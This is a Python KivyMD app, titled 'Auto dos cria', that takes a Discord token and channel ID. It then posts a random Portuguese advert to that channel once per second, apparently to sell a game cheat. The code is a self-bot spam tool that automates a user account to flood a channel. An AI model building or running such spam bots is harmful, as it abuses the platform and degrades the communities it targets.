from kivymd.app import MDApp
from kivymd.uix.label import MDLabel
from kivymd.uix.screen import MDScreen
from kivy.app import App
from kivymd.uix.floatlayout import  MDFloatLayout
from kivy.clock import Clock
import requests
import time
import re, os, asyncio, random, string
from kivymd.uix.floatlayout import FloatLayout
from kivymd.uix.button import MDFlatButton, MDIconButton, MDFloatingActionButton, MDRectangleFlatButton, MDRaisedButton, MDRectangleFlatIconButton
#from kivymd.uix.toolbar import MDToolbar
from kivy.lang import Builder


texto = ["compre o auto com o shatei", "o valor do auto é 50k de pc", "nao usa ac em sv publico pro bem de todos"]









kv = '''
MDFloatLayout:
	md_bg_color: 0.85, 0.95, 1, 1
	
	MDTextField:
		hint_text: "Token"
		multiline: True
		id: token
		
		size_hint_x: 0.8
		color_mode: 'custom'
		
		
		pos_hint: {"center_x":0.5, "center_y": 0.50}
	
	
	MDTextField:
		hint_text: "ChatId"
		id: chat
		
		size_hint_x: 0.8
		color_mode: 'custom'
		
		
		pos_hint: {"center_x":0.5, "center_y": 0.40}
	
	MDFillRoundFlatButton:
		text: "Iniciar"
		
		size_hint_x: 0.8
		color_mode: 'custom'
		elevation: 8
		theme_text_color: "Custom"
		font_size: 35
		text_color: 0.85, 0.95, 1, 1
		on_press: app.login()
		
		pos_hint: {"center_x":0.5, "center_y": 0.30}
		
		
		
	MDLabel:
		id: titulo
		text: "Auto dos cria"
		theme_text_color: "Custom"

		text_color: 112,128,144
		font_style: "H5"
		bold: True
		halign: "center"
		pos_hint: {"center_x":0.5, "center_y": 0.60}
	
	MDLabel:
		id: mens
		text: ""
		theme_text_color: "Custom"

		text_color: 112,128,144
		
		bold: True
		halign: "center"
		pos_hint: {"center_x":0.5, "center_y": 0.15}
	
	
	
	
'''


class auto(MDApp, App):
    
    def spam(self, *args):
    	
    	
    	url = f"https://discord.com/api/v10/channels/{chat}/messages"
    	header = {"authorization": token}
    	payload = {'content': texto[random.randint(0, 2)]}
    	r = requests.post(f'https://discord.com/api/v10/channels/{chat}/messages', data=payload, headers=header)
    	try:
    		print(r.json()["content"])
    		self.root.ids.mens.text = "Sucesso"
    	except:
    		self.root.ids.mens.text = "Error\nVerifique seu token ou o id"
    		pass
    
    
    
    
    
    def start(self):
    	Clock.schedule_interval(self.spam, 1)
   
    	

    
    	
    def build(self):
       self.theme_cls.primary_palette = "Gray"
       
       layout = Builder.load_string(kv)
       return layout
    def login(self):
    	global token
    	global chat
    	token = self.root.ids.token.text
    	#print(token)
    	chat = self.root.ids.chat.text
    	if token and chat:
    	   	
    	   
    	   	self.start()
    	   	
    	   	
    	   
    	   
    	else:
    		self.root.ids.mens.text = "Coloque seu token e o ID do chat"

       
	#def login(self):
		
  

auto().run()
